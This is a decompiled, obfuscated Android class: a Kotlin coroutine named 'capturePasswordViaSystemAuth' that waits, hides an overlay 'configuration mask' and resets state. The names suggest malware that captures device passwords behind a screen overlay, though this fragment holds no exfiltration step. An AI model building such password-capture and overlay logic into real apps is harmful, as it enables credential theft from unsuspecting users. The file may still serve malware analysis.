package com.storm.safe.rock.service;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C0763km;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$capturePasswordViaSystemAuth$2", m214403f = "dqtvuisjd.kt", m214404l = {10934}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$capturePasswordViaSystemAuth$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52491a1;

    /* renamed from: a2 */
    public final /* synthetic */ boolean f52492a2;

    /* renamed from: a3 */
    public final /* synthetic */ dqtvuisjd f52493a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$capturePasswordViaSystemAuth$2(InterfaceC0876mv interfaceC0876mv, dqtvuisjd dqtvuisjdVar, boolean z) {
        super(2, interfaceC0876mv);
        this.f52492a2 = z;
        this.f52493a3 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$capturePasswordViaSystemAuth$2(interfaceC0876mv, this.f52493a3, this.f52492a2);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$capturePasswordViaSystemAuth$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52491a1;
        if (i == 0) {
            kg1.m213544f4(obj);
            if (this.f52492a2) {
                this.f52491a1 = 1;
                if (b81.m210571b1(2000L, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            }
            dqtvuisjd dqtvuisjdVar = this.f52493a3;
            boolean z = this.f52492a2;
            dqtvuisjdVar.f52485l6 = 0;
            dqtvuisjdVar.f52474k5 = true;
            dqtvuisjdVar.m211457e6(z);
            return C1351vv.f60710b1;
        }
        if (i != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        kg1.m213544f4(obj);
        C0763km c0763km = this.f52493a3.f52427f8;
        if (c0763km != null) {
            c0763km.m213600a0();
            t60.m214714d6("dqtvuisjd", "🖤 已隐藏配置遮罩");
        }
        dqtvuisjd dqtvuisjdVar2 = this.f52493a3;
        boolean z2 = this.f52492a2;
        dqtvuisjdVar2.f52485l6 = 0;
        dqtvuisjdVar2.f52474k5 = true;
        dqtvuisjdVar2.m211457e6(z2);
        return C1351vv.f60710b1;
    }
}
